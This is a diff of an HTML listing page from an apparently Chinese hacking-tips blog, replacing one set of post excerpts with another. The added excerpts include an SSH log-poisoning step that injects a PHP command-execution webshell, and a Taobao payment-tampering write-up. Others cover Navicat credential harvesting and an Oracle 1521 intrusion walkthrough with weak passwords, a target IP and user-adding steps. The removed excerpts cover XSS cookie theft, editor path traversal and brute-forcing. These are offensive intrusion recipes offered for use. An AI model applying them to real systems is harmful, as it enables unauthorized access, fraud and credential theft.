@@ -45,27 +45,32 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2011-09-19T19:39:04.000Z" itemprop="datePublished">
-          2011-09-20
+      <time datetime="2012-07-02T09:39:36.000Z" itemprop="datePublished">
+          2012-07-02
       </time>
     
     
     | 
-    <a href='/tag/xss/'>xss</a>
+    <a href='/tag/漏洞/'>漏洞</a>,
+    
+    <a href='/tag/ssh/'>ssh</a>,
+    
+    <a href='/tag/包含漏洞/'>包含漏洞</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/79.seo/">利用xss偷cookie 教学</a></h2>
+      <h2 class="post-title"><a href="/622.seo/">利用SSH来包含执行命令</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-          譯:[hiphop]  使用的工具：  1.免费网页支援PHP  2.存在xss的脆弱的网站。  vb.php为存放cookie的网页  PHP Code:&lt;head&gt;&lt;meta http-equiv=”Content-Language” content=”it”&gt;&lt;title&gt;Cookies Stealther - Designed and programmed by R00t[ATI]&lt;
+        <p>转自<a href="http://www.ayhacker.net/ayblog/read.php?173">http://www.ayhacker.net/ayblog/read.php?173</a></p>
+<p>文章的总体思路就是：<br>使用<br>ssh ‘&lt;pre&gt;&lt;?echo system($_GET[‘cmd’]); exit;?&gt;’@10.10.11.33登入，然后会在<a href="http://ha.cker.in/tag/ssh" target="_blank">ssh</a>的登入日志里记录，再让存在<a href="http://ha.cker.in/tag/包含漏洞" target="_blank">包含漏洞</a>php去包含错误日志文件来达到目的。<br>包含正常的日志文件<br><img style="display: inline; border-width: 0px;" title="clip_image001" src="http://img.cker.in/SSH_C60/clip_image001.png" alt="clip_image001" width="819" height="322" border="0" /><br>使用特定的一句话木马作为帐号登入，产生含有一句话的日志文件<br><img style="display: inline; border-width: 0px;" title="clip_image002" src="http://img.cker.in/SSH_C60/clip_image002.png" alt="clip_image002" width="635" height="87" border="0" /><br>再次包含日志文件<br><img style="display: inline; border-width: 0px;" title="clip_image003" src="http://img.cker.in/SSH_C60/clip_image003.png" alt="clip_image003" width="1171" height="208" border="0" /><br>成功执行</p>
       
       </p>
       
       <p>
-          <a href="/79.seo/" class="excerpt-link">Read More...</a>
+          <a href="/622.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -74,27 +79,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2011-09-13T00:55:51.000Z" itemprop="datePublished">
-          2011-09-13
+      <time datetime="2012-07-02T07:59:05.000Z" itemprop="datePublished">
+          2012-07-02
       </time>
     
     
     | 
-    <a href='/tag/Google-Hack/'>Google Hack</a>
+    <a href='/tag/漏洞/'>漏洞</a>,
+    
+    <a href='/tag/post/'>post</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/76.seo/">Google Hack 最新版</a></h2>
+      <h2 class="post-title"><a href="/619.seo/">淘宝网某处存在严重支付漏洞</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>新的Google Hack技巧</p><br><p><strong>1.phonebook:+英文姓名</strong><br /><br>    作用：搜索电话号码簿，将会返回美国人姓名街道地址和电话号码列表，均真实，对需要大量美国地址的朋友很有用，只要是英文姓名都能找到。<br /><br>    例：phonebook:tom<br /><br>    另外还有两个小分类：rphonebook:仅搜索住宅用户电话号码簿；bphonebook:仅搜索商业的电话号码簿。</p><br><p><strong>2.cache:+网址</strong><br /><br>    作用：打开google对该网址的缓存页，很多被删掉的文章或网站，只要知道链接就可以用这种方法打开，但是google快照被墙了，所以要配合代理使用。</p><br><p><strong>3.related:+网址</strong><br /><br>    作用：找出和该网址类似的网站，比如想知道和amazon.com类似的大型网络书店有哪些时输入amazon.com网址。<br /><br>    例：related:amazon.com<br /><br>    <strong>4.inurl:+关键词<br /><br>    </strong>作用：用来寻找包含该关键词的网址，灵活使用的话是非常强的功能，比如许多人用来找在线的监视摄像头，网站后门什么的。<br /><br>    例：inurl:mail（可找一些免费邮箱）</p><br><p><strong>5.音乐搜索</strong><br /><br>    找不到某首曲子的时候用这个方法试试<br /><br>    音乐名（或任意关键词）+ intitle:&rdquo;index.of&rdquo; &ldquo;parent directory&rdquo; &ldquo;size&rdquo; &ldquo;last modified&rdquo; &ldquo;description&rdquo; [snd] (mp4|mp3|avi) -inurl:(jsp|php|html|aspx|htm|cf|shtml|lyrics|mp3s|mp3|index) -gallery -intitle:&rdquo;last modified&rdquo; -intitle:(intitle|mp3)</p><br><p><strong>以下是另外一些google搜索技巧详解</strong>(不同颜色标注了不同的语法命令，绿色的较为常用的命令，黄色的是不常用但却非常有用的命令，蓝色是Google不推荐使用的命令)：<strong>：</strong></p><br><p><strong>phonebook</strong>: 当我们用phonebook进行查询的时候，Google会返回美国当地跟查询关键词相关的电话信息。（使用phonebook的时候需要指定详细的州名和地点名）例，［phonebook:smith ca］</p><br><p><strong>allinanchor: </strong>anchor是一处说明性的文字，它标注说明了这个链接可能跳转到其它的网页或跳转 到当前网页的不同地方。当我们用allinanchor提交查询的时候，Google会限制搜索结果必须是那些在anchor文字里包含了我们所有查询关 键词的网页。例[ allinanchor: best museums Sydney ] ,提交这个查询，Google仅仅会返回在网页anchor说明文字里边包含了关键词&rdquo;best&rdquo; &ldquo;museums&rdquo; 和&rdquo;Sydney&rdquo;的网面。</p><br><p><strong>allintext</strong>: 当我们用allintext提交查询的时候，Google会限制搜索结果仅仅是在网页正 文里边包含了我们所有查询关键词的网页。例［allintext: travel packing list］,提交这个查询，Google仅仅会返回在一个网页包含了三个关键词&rdquo;travel&rdquo; &ldquo;packing&rdquo;和&rdquo;list&rdquo;的网页。
+        <p>转自乌云<a href="http://www.wooyun.org/bugs/wooyun-2010-07293">http://www.wooyun.org/bugs/wooyun-2010-07293</a></p>  <p>漏洞详情</p>  <p>披露状态：</p>  <p>2012-05-18： 细节已通知厂商并且等待厂商处理中   <br />2012-05-18： 厂商已经确认，细节仅向厂商公开    <br />2012-05-28： 细节向核心白帽子及相关领域专家公开    <br />2012-06-07： 细节向普通白帽子公开    <br />2012-06-17： 细节向实习白帽子公开    <br />2012-07-02： 细节向公众公开</p>  <p>简要描述：</p>  <p>淘宝网某处存在支付漏洞，未使用SSL加密支付过程，同时，对支付过程相关代码的审计存在一定缺陷，导致漏洞产生。会导致允许用户对支付金额进行修改，给厂商带来很大的利益损失。</p>  <p>详细说明：</p>  <p>在阿里旺旺2012中，使用短信旺旺中心对短信条数进行充值，在该过程中，未使用SSL安全连接，同时存在支付漏洞。   <br />选择充值的金额后，下一步，使用<a href="http://ha.cker.in/tag/Fiddler" target="_blank">Fiddler</a>截取数据包，GBK编码，修改POST数据中的数据，seriesPrice为支付的金额，seriesNum为充值的条数，这两个地方理论上都可以进行修改，这里以修改seriesPrice为例。</p>  <p>漏洞证明：</p>  <p>充值前截图</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/bdc6a26da239_15137/clip_image001.jpg" width="532" height="443" /></p>
       
       </p>
       
       <p>
-          <a href="/76.seo/" class="excerpt-link">Read More...</a>
+          <a href="/619.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -103,27 +110,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2011-08-25T20:40:05.000Z" itemprop="datePublished">
-          2011-08-26
+      <time datetime="2012-07-02T06:06:45.000Z" itemprop="datePublished">
+          2012-07-02
       </time>
     
     
     | 
-    <a href='/tag/编辑器/'>编辑器</a>
+    <a href='/tag/拿shell/'>拿shell</a>,
+    
+    <a href='/tag/突破星外/'>突破星外</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/72.seo/">cuteeditor编辑器利用方法两则</a></h2>
+      <h2 class="post-title"><a href="/616.seo/">关于后台只读备份拿shell</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        方法1.直接下载load.ashx配置文件http://ha.cker.in/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config然后查看一些sql配置信息 从sql数据库连接入手&lt;connectionStrings&gt;&lt;add name=”ynncConnectionString” connectionString=”S
+        <p>今天在旁注一个站点的过程中遇到了一个十分有意思的站,拿出来跟大家分享下.&#160; 小菜文章没技术含量大牛路过    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; margin-left: 0px; border-top: 0px; margin-right: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/shell_14827/clip_image001.jpg" width="590" height="364" />这是这个站的后台用 账号admin密码admin进去以后发现里面是精良的框架搭建的</p>
       
       </p>
       
       <p>
-          <a href="/72.seo/" class="excerpt-link">Read More...</a>
+          <a href="/616.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -132,27 +141,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2011-08-08T23:11:28.000Z" itemprop="datePublished">
-          2011-08-09
+      <time datetime="2012-06-21T15:10:35.000Z" itemprop="datePublished">
+          2012-06-21
       </time>
     
     
     | 
-    <a href='/tag/漏洞/'>漏洞</a>
+    <a href='/tag/利用navicat提权/'>利用navicat提权</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/63.seo/">FCK各版本突破</a></h2>
+      <h2 class="post-title"><a href="/587.seo/">利用navicat提权</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        FCKeditor v2.43版本FCKeditor/editor/filemanager/browser/default/connectors/php/config.php    FCKeditor V2.6.6版本 fckeditor/editor/filemanager/connectors/asp/config.php查看编辑器版本    FCKeditor/whatsnew.html    &mdash;&mdash;&mda
+        navicat是一个比较流行的MySQL管理工具，在很多服务器上都可以找到   有两个方法提权：   1、从日志文件里找密码，navicat会把操作日志（比如加账户）保存到My Documents\Navicat\MySQL\logs下的LogHistory.txt，低版本是安装目录下的logs下LogHistory.txt   2、navicat管理的MySQL服务器信息（一般是root帐户）是存在注册表里的，具体是HKEY_CURR
       
       </p>
       
       <p>
-          <a href="/63.seo/" class="excerpt-link">Read More...</a>
+          <a href="/587.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -161,27 +170,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2011-08-05T05:47:58.000Z" itemprop="datePublished">
-          2011-08-05
+      <time datetime="2012-06-21T10:26:32.000Z" itemprop="datePublished">
+          2012-06-21
       </time>
     
     
     | 
-    <a href='/tag/Crack/'>Crack</a>
+    <a href='/tag/1521/'>1521</a>,
+    
+    <a href='/tag/oracle/'>oracle</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/59.seo/">一个暴力破解MSSQL用户密码的asp程序</a></h2>
+      <h2 class="post-title"><a href="/557.seo/">入侵1521详细过程</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        一个暴力破解MSSQL用户密码的asp程序 以下这个版本是可以运行之后关闭浏览器，运行完毕将在当前目录生成结果文件的。  ‘============ asp Port Scanner by lake2 ===================‘http://lake2.0x54.org‘Version: 0.1‘For SpringBoard‘================================================
+        <p>入侵<a href="http://ha.cker.in/tag/1521" target="_blank">1521</a>详细过程 </p>  <p>工具： </p>  <p>1.<a href="http://ha.cker.in/tag/oracle" target="_blank">oracle</a>精简版(我这已经安装了，这跳过) </p>  <p>2.sqlplus.exe 连接oracle数据库用（oracle里自带） </p>  <p>3.tnscmd.exe&#160;&#160; 查看服务器名字/sid </p>  <p>4.oscanner.exe oracle弱口令猜解工具 </p>  <p>第一步：扫描开了1521端口的服务器，oracle默认1521端口（这步跳过，端口谁都会扫） </p>  <p>第二步：利用tnscmd.exe查看服务器数据库的名字 </p>  <p>从这步开始了，这是刚找好的IP，就用它演示了，“SERVICE_NAME=<strong>*</strong>”这就是我们需要用到的。 </p>  <p>第三步：oscanner.exe猜解弱口令。 </p>  <p>猜解不会太快，呵呵，“DBSNMP/DBSNMP found”发现一个，再让它往下继续猜……“SCOTT/TIGER    <br />found’又一个，猜完了 </p>  <p>第四步：提权（提升oracle用户权限、开3389、添加windows用户） </p>  <p>看操作吧，首先当然是要连接数据库，&quot;已连接。&quot;那就是成功了，呵呵，oracle能猜出很多弱口令，但是 </p>  <p>很多都是低权限的，没法执行命令，所以我们就要提升oracle用户权限，“已选择14行。”权限很低~~~ </p>  <p>需要重新连接数据库，再次查看权限，“已选择140行。”这就可以让我们为所欲为了，呵呵，看到这些顿时兴奋了， </p>  <p>这就是成功执行命令了，“PL/SQL 过程已成功完成。Java 已创建。函数已创建。过程已创建。…….” </p>  <p>脚本里我加了开3389和添加用户……连接它的3389试试…. </p>  <p>熟悉的画面，一台oracle服务器就这么被拿下了，呵呵…….. </p>  <p>这是手工一步步进行的，方便大家了解这一过程，我也有全自动的1521，并非网上所流传的，效果那是相当好，呵呵 </p>  <p>但是不足之处就是，抓的没数量，但有质量！！！呵呵…… </p>  <p>远程接oracle命令：   <br />C:\&gt;sqlplus /nolog    <br />SQL&gt; connect SCOTT/TIGER@(description=(address_list=(address=(protocol=tcp)(host=60.30.73.162)(port=1521)))(connect_data=(SERVICE_NAME=ebestXDB))); </p>  <p>tnscmd用法：tnscmd status -h ip –indent </p>  <p>oscanner用法：oscanner -s ip -v </p>  <p>查看当前用户权限：SELECT PRIVILEGE FROM SESSION_PRIVS; </p>
       
       </p>
       
       <p>
-          <a href="/59.seo/" class="excerpt-link">Read More...</a>
+          <a href="/557.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -190,22 +201,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2011-07-29T20:19:32.000Z" itemprop="datePublished">
-          2011-07-30
+      <time datetime="2012-06-20T12:14:27.000Z" itemprop="datePublished">
+          2012-06-20
       </time>
     
+    
+    | 
+    <a href='/tag/Shopex-4-8-5/'>Shopex 4.8.5</a>,
+    
+    <a href='/tag/后台拿shell/'>后台拿shell</a>
+    
+    
 </span>
-      <h2 class="post-title"><a href="/54.seo/">病毒分析在线沙盘 & 恶意行为分析工具SysAnalyzer</a></h2>
+      <h2 class="post-title"><a href="/539.seo/">Shopex 4.8.5 SQL Injection 注射，后台拿shell</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        病毒分析在线沙盘：1. Anubis- Analyzing Unknown Binarieshttp://analysis.seclab.tuwien.ac.at/index.php2. CWSandbox - Automatic Behavior Analysis of Malwarehttp://www.cwsandbox.org/?page=submit3. Joebox - a secure Sandbox Applicatio
+        Shopex 4.8.5 SQL Injection 注射注射注射~【转】   转 t00ls大牛  大牛们 你们还在犹豫神马?&#160; 赶紧发帖啊….&#160; 你们不发&#160; 那只好我来破这个处了   正好这两天电信抽风所以就抽空读了下      漏洞核心函数 \core\model_v5\trading\mdl.goods.php&#160; 由于是zend解密出来的 具体行数就不贴了   01&#160;&#160;
       
       </p>
       
       <p>
-          <a href="/54.seo/" class="excerpt-link">Read More...</a>
+          <a href="/539.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -213,7 +231,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/category/黑客技巧/page/8/">← Newer Posts</a>
-    <span class="page-number">Page 9 of 10</span>
+    <span class="page-number">Page 9 of 13</span>
     <a class="older-posts" href="/category/黑客技巧/page/10/">Older Posts →</a>
   </nav>
 </main>
